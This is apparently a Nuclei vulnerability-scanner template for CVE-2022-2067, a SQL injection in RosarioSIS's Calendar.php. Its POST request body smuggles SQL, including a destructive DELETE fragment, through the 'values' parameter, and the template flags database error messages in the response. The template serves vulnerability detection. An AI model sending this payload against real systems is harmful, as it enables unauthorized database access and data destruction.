id: CVE-2022-2067

info:
  name: SQL Injection in RosarioSIS Calendar.php
  author: ProjectDiscoveryAI
  severity: critical
  description: SQL Injection vulnerability in Calendar.php in francoisjacquet/rosariosis allows attackers to execute arbitrary SQL commands via the 'values' parameter.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data or complete takeover of the affected system.
  remediation: |
    Apply the latest security patches provided by RosarioSIS to fix the SQL Injection vulnerability in Calendar.php.
  reference:
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2022-2067
    cwe-id: CWE-89
    epss-score: 0.00132
    epss-percentile: 0.49586
    cpe: cpe:2.3:a:rosariosis:rosariosis:*:*:*:*:*:*:*:*
  metadata:
    vendor: rosariosis
    product: rosariosis

http:
  - method: POST
    path:
      - "{{BaseURL}}/demonstration/Modules.php?modname=School_Setup/Calendar.php&modfunc=detail&event_id=new&month=04&year=2022"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      Cookie: RosarioSIS=ls2p6bohdqumdr8oecokk4j3bp8e79vs3mrhkgn37905r7i2phi0
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
      Sec-Ch-Ua: "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\""
      Sec-Ch-Ua-Mobile: ?0
      Sec-Ch-Ua-Platform: "Linux"
      Origin: https://www.rosariosis.org
      Sec-Fetch-Site: same-origin
      Sec-Fetch-Mode: cors
      Sec-Fetch-Dest: empty
      Referer: https://www.rosariosis.org/demonstration/Modules.php?modname=School_Setup/Calendar.php&modfunc=detail&year=2022&month=04&school_date=2022-04-04&event_id=new
      Accept-Encoding: gzip, deflate
      Accept-Language: en-US,en;q=0.9,vi;q=0.8,no;q=0.7
      Connection: close

    body: |
      month_values[SCHOOL_DATE]=04&day_values[SCHOOL_DATE]=04&year_values[SCHOOL_DATE]=202'2&REPEAT=1&values[DESCRIPTION) values (23, "2021", "1", NULL);DELETE *FROM ;--][TITLE]=123&values[DESCRIPTION]=&button=Save
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "database error"
        part: body
